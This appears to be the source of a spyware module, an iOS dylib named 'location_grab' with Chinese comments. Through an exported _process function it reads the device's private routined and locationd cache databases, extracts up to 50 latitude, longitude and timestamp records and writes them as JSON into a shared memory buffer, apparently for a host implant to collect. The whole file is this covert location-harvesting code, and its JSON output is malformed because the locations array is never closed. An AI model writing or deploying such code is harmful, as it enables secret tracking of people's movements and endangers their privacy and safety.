/**
 * location_grab.dylib — iPad 定位数据采集
 * 编译: xcrun --sdk iphoneos clang -arch arm64 -dynamiclib
 *         -fobjc-arc -mios-version-min=14.0
 *         -framework Foundation -lsqlite3
 *         -o location_grab.dylib location_grab.c
 *
 * 读取 routined 频繁位置缓存 + 其他定位相关数据库
 */

#import <Foundation/Foundation.h>
#import <sqlite3.h>
#import <stdint.h>
#import <string.h>

#define STATE_READY 3
#define MAX_OUTPUT  (8 * 1024 * 1024)
#define MAX_ENTRIES 50

static void write_buffer(uint32_t *buf, const char *json, size_t len) {
    if (len > MAX_OUTPUT - 8) len = MAX_OUTPUT - 8;
    memcpy((uint8_t *)buf + 8, json, len);
    buf[1] = (uint32_t)len;
    buf[0] = STATE_READY;
}

// 尝试从 SQLite 表读取 location 记录
static NSUInteger query_table(sqlite3 *db, const char *sql,
    NSMutableString *json, NSUInteger count, const char *label) {
    sqlite3_stmt *stmt = NULL;
    int rc = sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);
    if (rc != SQLITE_OK) return count;

    while (sqlite3_step(stmt) == SQLITE_ROW && count < MAX_ENTRIES) {
        double lat = 0, lng = 0;
        const char *ts = NULL;

        int cols = sqlite3_column_count(stmt);
        for (int i = 0; i < cols; i++) {
            const char *name = sqlite3_column_name(stmt, i);
            if (name) {
                if (!ts && (strstr(name, "date") || strstr(name, "Date") ||
                    strstr(name, "time") || strstr(name, "Time") ||
                    strstr(name, "timestamp")))
                    ts = (const char*)sqlite3_column_text(stmt, i);
                if (lat == 0 && strstr(name, "latitude"))
                    lat = sqlite3_column_double(stmt, i);
                if (lng == 0 && strstr(name, "longitude"))
                    lng = sqlite3_column_double(stmt, i);
            }
        }

        if (lat != 0 || lng != 0) {
            if (count > 0) [json appendString:@","];
            [json appendFormat:
                @"{\"lat\":%.6f,\"lng\":%.6f,\"source\":\"%s\"",
                lat, lng, label];
            if (ts) [json appendFormat:@",\"ts\":\"%s\"", ts];
            [json appendString:@"}"];
            count++;
        }
        if (json.length > MAX_OUTPUT - 4096) break;
    }
    sqlite3_finalize(stmt);
    return count;
}

__attribute__((visibility("default")))
void _process(uint32_t *shared) {
    @autoreleasepool {
        NSMutableString *json = [NSMutableString stringWithFormat:
            @"{\"status\":\"ok\",\"type\":\"location\",\"locations\":["];

        NSUInteger total = 0;

        // 尝试多个定位相关数据库路径
        const char *dbs[] = {
            "/var/mobile/Library/Caches/com.apple.routined/cache.sqlitedb",
            "/var/mobile/Library/Caches/locationd/cache.sqlitedb",
            NULL
        };

        // 可能的表名和列名组合
        const char *queries[] = {
            "SELECT ZLATITUDE, ZLONGITUDE, ZDATE FROM ZRTCLLOCATIONMO ORDER BY ZDATE DESC LIMIT 50",
            "SELECT latitude, longitude, timestamp FROM ZRTLEARNEDLOCATIONOFINTERESTMO ORDER BY timestamp DESC LIMIT 50",
            "SELECT latitude, longitude, date FROM location ORDER BY date DESC LIMIT 50",
            "SELECT Latitude, Longitude, Date FROM ZLOCATION ORDER BY Date DESC LIMIT 50",
            "SELECT ZLATITUDE, ZLONGITUDE, ZTIMESTAMP FROM ZLOCATIONMO ORDER BY ZTIMESTAMP DESC LIMIT 50",
            NULL
        };

        for (int i = 0; dbs[i]; i++) {
            sqlite3 *db = NULL;
            int rc = sqlite3_open_v2(dbs[i], &db,
                SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX, NULL);
            if (rc != SQLITE_OK || !db) continue;

            // 先获取表列表
            sqlite3_stmt *tblStmt = NULL;
            rc = sqlite3_prepare_v2(db,
                "SELECT name FROM sqlite_master WHERE type='table'", -1, &tblStmt, NULL);
            if (rc == SQLITE_OK) {
                while (sqlite3_step(tblStmt) == SQLITE_ROW) {
                    const char *tbl = (const char*)sqlite3_column_text(tblStmt, 0);
                    if (!tbl) continue;
                    // 启发式: 表名中包含 location, rt, cl 等
                    const char *tlow = tbl;
                    int match = 0;
                    if (strcasestr(tlow, "location") || strcasestr(tlow, "locat") ||
                        strcasestr(tlow, "mocli") || strcasestr(tlow, "rtclloc") ||
                        strcasestr(tlow, "place"))
                        match = 1;

                    if (match) {
                        char q[512];
                        snprintf(q, sizeof(q),
                            "SELECT * FROM \"%s\" LIMIT %d", tbl, MAX_ENTRIES);
                        total = query_table(db, q, json, total, tbl);
                    }
                }
            }
            sqlite3_finalize(tblStmt);

            // 尝试预定义查询
            for (int q = 0; total < MAX_ENTRIES && queries[q]; q++) {
                total = query_table(db, queries[q], json, total, "route");
            }

            sqlite3_close(db);
            if (total >= MAX_ENTRIES) break;
        }

        [json appendFormat:@",\"total\":%lu}", (unsigned long)total];

        if (total == 0) {
            json = [NSMutableString stringWithString:
                @"{\"status\":\"ok\",\"type\":\"location\",\"total\":0,"
                @"\"msg\":\"no_location_data_found\",\"locations\":[]}"];
        }

        const char *cstr = [json UTF8String];
        write_buffer(shared, cstr, strlen(cstr));
    }
}
